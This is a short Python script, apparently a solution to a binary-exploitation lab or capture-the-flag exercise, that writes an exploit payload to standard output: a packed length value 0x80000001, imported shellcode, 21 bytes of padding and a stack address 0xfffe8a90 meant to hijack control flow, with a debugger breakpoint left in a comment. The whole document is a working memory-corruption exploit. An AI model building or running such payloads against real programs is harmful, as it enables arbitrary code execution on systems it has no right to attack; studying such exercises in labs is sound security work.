from shellcode import shellcode
from struct import pack
import sys


# break *0x08049ea1
def main():
	sys.stdout.buffer.write(pack("<I", 0x80000001) + shellcode + ('\x22' * 21).encode('utf-8') + pack("<I", 0xfffe8a90))



if __name__ == "__main__":
	main()